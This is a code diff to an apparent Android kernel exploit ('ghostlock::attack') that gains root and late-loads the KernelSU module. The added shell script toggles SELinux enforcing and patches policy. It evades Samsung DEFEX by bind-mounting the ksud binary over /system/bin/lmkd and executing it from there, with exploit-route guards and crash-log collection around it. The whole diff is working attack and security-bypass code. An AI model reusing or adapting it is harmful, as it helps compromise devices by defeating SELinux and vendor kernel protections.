@@ -96,6 +96,28 @@ namespace ghostlock::attack {
         /* PROFILE-SUGGEST-01: execution tuning arrives fully merged from Kotlin;
          * the native side only consumes the resolved values. */
         session::g_exploit_session.profile = profile::TargetProfile::from(&decoded);
+        /* The multicast and sigreturn routes stamp the compact eleven-word
+         * `rt_mutex_waiter` strip. A 6.6+ image's `rt_waiter_node` shape is a
+         * different object (handing the walk `pi_tree.rb_left` as `lock`), so
+         * a profile that selects either on such a device is refused here --
+         * the extractor already refuses to emit one. This is the runtime guard
+         * for a hand-edited or imported document. */
+        const auto route = session::g_exploit_session.profile.route();
+        const auto fallback = session::g_exploit_session.profile.fallback_route();
+        const auto guarded = [](profile::RouteKind kind) {
+            return kind == profile::RouteKind::MulticastWaiter ||
+                   kind == profile::RouteKind::Sigreturn;
+        };
+        if ((guarded(route) || guarded(fallback)) &&
+            !session::g_exploit_session.profile.waiter_is_compact()) {
+            const auto offending = guarded(route) ? route : fallback;
+            pr_error("profile route %s needs the compact rt_mutex_waiter strip; "
+                     "this profile's waiter is the 6.6+ rt_waiter_node shape\n",
+                     offending == profile::RouteKind::MulticastWaiter
+                             ? "multicast_waiter"
+                             : "sigreturn");
+            throw FatalError{};
+        }
         pr_success("resolved profile loaded: %s\n",
                    session::g_exploit_session.profile.release());
         if (config::runtime_config_snapshot().apply_profile(&session::g_exploit_session.profile) != 0)
@@ -266,6 +288,21 @@ namespace ghostlock::attack {
             "#!/system/bin/sh\n"
             "HOME_DIR='%s'\n"
             "LOG='%s'\n"
+            /* The app's files dir has failed to take this log before (one
+             * transient EACCES on 2026-11-09). Fall back to a root-writable
+             * path and announce it on stdout (the native captures stdout as
+             * script-output), so the run still has a log somewhere. */
+            "if ! ( : >>\"$LOG\" ) 2>/dev/null; then\n"
+            "  LOG=\"${TMPDIR:-/data/local/tmp}/ghostlock-ksu-$$.log\"\n"
+            "  echo \"LOG-FALLBACK=$LOG\"\n"
+            "fi\n"
+            /* Test hook: the app writes this file for the diagnostic A/B
+             * arms. "noinstrument" disables the drain, the dump and the
+             * probe, leaving the product path otherwise unchanged. */
+            "MODE_FILE=\"$HOME_DIR/dirtyfrag.mode\"\n"
+            "MODE_TEXT=$(cat \"$MODE_FILE\" 2>/dev/null)\n"
+            "NO_INSTR=0\n"
+            "case \"$MODE_TEXT\" in *noinstrument*) NO_INSTR=1 ;; esac\n"
             "SAFE_MODE=%d\n"
             "VRKO_SELINUX_BLOCK='%s'\n"
             "KSUD=\"$HOME_DIR/ksud\"\n"
@@ -295,9 +332,39 @@ namespace ghostlock::attack {
             "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
             "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
             "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
+            /* W1 leaves SELinux permissive; every post-W1 failure exit restores
+             * it, so a run that cannot finish the root phase does not leave the
+             * device permissive until reboot. Dumps are written before this
+             * call: the dump path is blocked once enforcing is back. */
+            "restore_enforce() {\n"
+            "  e_reason=\"$1\"\n"
+            "  e_before=$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
+            "  echo \"[*] enforcing restore: reason=$e_reason before=${e_before:-unreadable}\" >>\"$LOG\"\n"
+            "  if echo 1 > /sys/fs/selinux/enforce 2>/dev/null; then e_wrote=1; else e_wrote=0; fi\n"
+            "  e_after=$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
+            /* The DirtyFrag shell runs as toolbox, which may set but not read
+             * the enforce node: the successful write is the fact the stage can
+             * use. It goes to stdout, which survives the enforcing restore
+             * where a $LOG write does not. */
+            "  echo \"ENFORCE-RESTORE reason=$e_reason before=${e_before:-unreadable} wrote=$e_wrote readback=${e_after:-unreadable}\"\n"
+            "}\n"
             "if [ \"$(id -u)\" -ne 0 ]; then\n"
             "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
+            "  restore_enforce not-root\n"
             "  exit 1\n"
+            "fi\n"
+            /* Diagnostics for the Samsung mount path: the init shell's
+             * capability set and whether it can mount at all. Unredirected on
+             * purpose: the app's files dir may not be writable by this shell,
+             * and the native's script-output captures stdout. */
+            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
+            "  echo \"CAPS: $(grep Cap /proc/self/status 2>/dev/null | tr '\\n' ' ')\"\n"
+            "  if mount --bind /system/bin/lmkd /system/bin/lmkd 2>/dev/null; then\n"
+            "    echo 'MOUNT-PROBE=ok'\n"
+            "    umount -l /system/bin/lmkd 2>/dev/null\n"
+            "  else\n"
+            "    echo 'MOUNT-PROBE=fail'\n"
+            "  fi\n"
             "fi\n"
             /* The SELinux enforce-write block runs here: after the root-uid
              * check and before the iomem cache and the policy fixup, so a
@@ -391,8 +458,23 @@ namespace ghostlock::attack {
             /* debug archive: copy kernel/pstore/iomem evidence into the
              * --dump-kernel-log directory (empty disables the dump). */
             "DEBUG_DIR=\"%s\"\n"
+            /* Polled kernel-log drain: dmesg snapshot every 0.5 s, written
+             * atomically and synced, so a reset leaves the last lines in the
+             * debug dir (or the app's home dir). The loop also exits when the
+             * parent shell is gone; the EXIT trap kills it normally. */
+            "KMSG_LOG=\"\"\n"
+            "KMSG_DRAIN_PID=\"\"\n"
+            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
+            "  if [ -n \"$DEBUG_DIR\" ]; then KMSG_LOG=\"$DEBUG_DIR/kmsg-live.txt\"; fi\n"
+            "  if [ -z \"$KMSG_LOG\" ]; then KMSG_LOG=\"$HOME_DIR/kmsg-live.txt\"; fi\n"
+            "  if ! ( : >\"$KMSG_LOG\" ) 2>/dev/null; then KMSG_LOG=\"/data/local/tmp/kmsg-live-$$.txt\"; fi\n"
+            "  ( while kill -0 $$ 2>/dev/null; do timeout 2 dmesg 2>/dev/null | tail -n 300 >\"$KMSG_LOG.new\"; mv \"$KMSG_LOG.new\" \"$KMSG_LOG\" 2>/dev/null; sync; sleep 0.5; done ) &\n"
+            "  KMSG_DRAIN_PID=$!\n"
+            "  echo \"KMSG-DRAIN=$KMSG_LOG\"\n"
+            "fi\n"
             "dump_debug() {\n"
             "  [ -n \"$DEBUG_DIR\" ] || return 0\n"
+            "  [ \"$NO_INSTR\" -eq 0 ] || return 0\n"
             "  mkdir -p \"$DEBUG_DIR/pstore\" 2>/dev/null || { echo \"[!] debug dump: cannot write $DEBUG_DIR\" >>\"$LOG\"; return 0; }\n"
             "  {\n"
             "    echo '== uname -a =='\n"
@@ -406,12 +488,18 @@ namespace ghostlock::attack {
             "    echo '== selinux =='\n"
             "    getenforce 2>/dev/null\n"
             "  } >\"$DEBUG_DIR/kernel-info.txt\" 2>&1\n"
-            "  if ! dmesg >\"$DEBUG_DIR/kernel-dmesg.log\" 2>&1; then\n"
+            "  if ! timeout 2 dmesg >\"$DEBUG_DIR/kernel-dmesg.log\" 2>&1; then\n"
             "    echo '[!] dmesg unavailable' >>\"$DEBUG_DIR/kernel-dmesg.log\"\n"
             "  fi\n"
             "  for f in /sys/fs/pstore/*; do\n"
             "    [ -f \"$f\" ] || continue\n"
             "    cp \"$f\" \"$DEBUG_DIR/pstore/\" 2>/dev/null\n"
+            /* The app's export zips top-level files only; keep the
+             * subdirectory for a human, and put a flattened copy where the
+             * zip will actually carry it. pstore is read on the next run's
+             * shell (the app has no root at boot), so the previous boot's
+             * crash lands in this run's folder. */
+            "    cp \"$f\" \"$DEBUG_DIR/pstore-${f##*/}\" 2>/dev/null\n"
             "  done\n"
             "  cp /proc/iomem \"$DEBUG_DIR/iomem.txt\" 2>/dev/null\n"
             "  cp \"$LOG\" \"$DEBUG_DIR/ksu.log\" 2>/dev/null\n"
@@ -422,10 +510,15 @@ namespace ghostlock::attack {
             "  chmod 644 \"$DEBUG_DIR\"/*.txt \"$DEBUG_DIR\"/*.log 2>/dev/null\n"
             "  chmod 755 \"$DEBUG_DIR\"/pstore 2>/dev/null\n"
             "  chmod 644 \"$DEBUG_DIR\"/pstore/* 2>/dev/null\n"
+            "  chmod 644 \"$DEBUG_DIR\"/pstore-* 2>/dev/null\n"
             "  echo \"[*] debug dump written to $DEBUG_DIR\" >>\"$LOG\"\n"
             "}\n"
             "# W1's 64-bit child pointer makes adjacent booleans non-zero.\n"
             "echo 0 > /sys/fs/selinux/checkreqprot 2>/dev/null\n"
+            "if grep -q ' /system/bin/lmkd ' /proc/self/mountinfo 2>/dev/null; then\n"
+            "  umount -l /system/bin/lmkd 2>/dev/null\n"
+            "  echo '[*] cleared a stale /system/bin/lmkd mount' >>\"$LOG\"\n"
+            "fi\n"
             "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
             "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
             "fi\n"
@@ -433,6 +526,7 @@ namespace ghostlock::attack {
             "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
             "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
             "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
+            "  restore_enforce kmi-parse\n"
             "  exit 1\n"
             "fi\n"
             "KMI=\"${AVER}-${KVER}\"\n"
@@ -463,9 +557,10 @@ namespace ghostlock::attack {
             "POLICY=\"$POLICY_DIR/ghostlock-selinux.policy\"\n"
             "printf '' >\"$POLICY\" 2>/dev/null || {\n"
             "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
+            "  restore_enforce policy-dump\n"
             "  exit 1\n"
             "}\n"
-            "trap 'rm -f \"$POLICY\"; dump_debug' EXIT\n"
+            "trap '[ -n \"$KMSG_DRAIN_PID\" ] && kill $KMSG_DRAIN_PID 2>/dev/null; [ -n \"$KMSG_LOG\" ] && rm -f \"$KMSG_LOG.new\" 2>/dev/null; umount -l /system/bin/lmkd 2>/dev/null; rm -f \"$POLICY\"; [ \"${DUMP_DONE:-0}\" = 1 ] || dump_debug' EXIT\n"
             "prepare_policy() {\n"
             "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
             "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
@@ -506,6 +601,10 @@ namespace ghostlock::attack {
             "  fi\n"
             "  sleep 2\n"
             "done\n"
+            /* Test hook: dirtyfrag.mode "failfixup" forces the failure branch so
+             * the failure-exit enforcing restore and the stage's DFRC verdict
+             * can be exercised on a device whose late-load would succeed. */
+            "case \"$MODE_TEXT\" in *failfixup*) echo '[*] test: forcing fixup failure' >>\"$LOG\"; FIXUP_RC=1 ;; esac\n"
             "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
             /* The working copy is spent once the policy loaded: delete it here,
              * not only in the EXIT trap. Measured 2026-10-09: the trap runs in
@@ -523,12 +622,41 @@ namespace ghostlock::attack {
             "  KSU_ALREADY=0\n"
             "  if [ ! -x \"$KSUD\" ]; then\n"
             "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
+            "    dump_debug\n"
+            "    DUMP_DONE=1\n"
+            "    restore_enforce ksud-missing\n"
             "    exit 1\n"
             "  fi\n"
             "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
+            "  dump_debug\n"
+            "  echo \"KSU-PHASE late-load-direct kmi=$KMI\"\n"
             "  chmod 755 \"$KSUD\" 2>/dev/null\n"
             "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
-            "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
+            "  KSU_LOAD_RC=$?\n"
+            "  echo \"[*] late-load exit=$KSU_LOAD_RC\" >>\"$LOG\"\n"
+            /* Samsung DEFEX safeplace kills a root exec of a /data binary
+             * (ksud) before it can load the module. Retry the same exec with
+             * the binary bind-mounted over a whitelisted system path: DEFEX
+             * sees /system/bin/lmkd, ksud runs, and the module is loaded from
+             * ksud's embedded asset. The mount is detached immediately after
+             * the call; lmkd never re-execs, so the window is inert. */
+            "  KSU_NOW=0\n"
+            "  for i in $(seq 1 20); do\n"
+            "    if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_NOW=1; break; fi\n"
+            "    sleep 0.1\n"
+            "  done\n"
+            "  if [ \"$KSU_NOW\" -ne 1 ]; then\n"
+            "    echo '[*] late-load did not load; retrying via the /system/bin/lmkd bind mount' >>\"$LOG\"\n"
+            "    echo 'KSU-PHASE late-load-mount'\n"
+            "    umount -l /system/bin/lmkd 2>/dev/null\n"
+            "    if [ -e /system/bin/lmkd ] && mount --bind \"$KSUD\" /system/bin/lmkd 2>>\"$LOG\"; then\n"
+            "      /system/bin/lmkd late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
+            "      echo \"[*] mounted late-load exit=$?\" >>\"$LOG\"\n"
+            "      umount -l /system/bin/lmkd 2>/dev/null\n"
+            "    else\n"
+            "      echo '[!] /system/bin/lmkd bind mount unavailable' >>\"$LOG\"\n"
+            "    fi\n"
+            "  fi\n"
             "fi\n"
             "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
             "KSU_READY=0\n"
@@ -536,17 +664,47 @@ namespace ghostlock::attack {
             "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
             "  sleep 0.1\n"
             "done\n"
-            "if [ \"$KSU_READY\" -ne 1 ]; then\n"
+            "if [ \"$KSU_READY\" -eq 1 ]; then\n"
+            "  echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
+            "else\n"
             "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
-            "  exit 1\n"
             "fi\n"
-            "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
+            /* Dump while still permissive: after the enforcing restore the
+             * toolbox domain cannot write the app's data dir, which is why the
+             * previous build's dump silently vanished. The late-load path also
+             * dumps before the load; a module-init re-enforce can make this
+             * second dump fail, but the earlier files remain. */
+            "dump_debug\n"
+            "DUMP_DONE=1\n"
             "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
             "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
-            "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
+            "  restore_enforce already-loaded\n"
+            "elif [ \"$KSU_READY\" -eq 1 ]; then\n"
+            /* The module re-enforces at the end of its init; this write is a
+             * no-op then, and the corrective one if it did not. */
+            "  restore_enforce late-loaded\n"
+            "fi\n"
+            /* Unredirected so the native's script-output carries the verdict
+             * even when the app's log path was not writable. The dmesg tail
+             * names the DEFEX/KDP side of a failed load before the box can
+             * reset (the polled drain keeps the last full snapshot). This
+             * block is diagnostic only: it runs after the marker, the dump and
+             * the enforcing restore, and every dmesg read is bounded, so a
+             * stuck dmesg can never hold the cleanup. */
+            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
+            "  echo \"KSU-SUMMARY enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) kernelsu=$(grep -c '^kernelsu' /proc/modules 2>/dev/null) lmkd_mount=$(grep -c ' /system/bin/lmkd ' /proc/self/mountinfo 2>/dev/null) log=$LOG\"\n"
+            "  timeout 2 dmesg 2>/dev/null | command grep -i -E 'defex|kdp|rkp|kernelsu' | tail -n 15\n"
+            "fi\n"
+            "if [ \"$KSU_READY\" -ne 1 ]; then\n"
+            "  restore_enforce ksu-not-loaded\n"
+            "  exit 1\n"
             "fi\n"
             "else\n"
-            "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
+            "  echo '[!] fixup failed; restoring enforcing' >>\"$LOG\"\n"
+            "  dump_debug\n"
+            "  DUMP_DONE=1\n"
+            "  restore_enforce fixup-failed\n"
+            "  exit 1\n"
             "fi\n",
             (config::runtime_config_snapshot().home_dir.c_str()),
             (config::runtime_config_snapshot().ksu_log_path.c_str()),
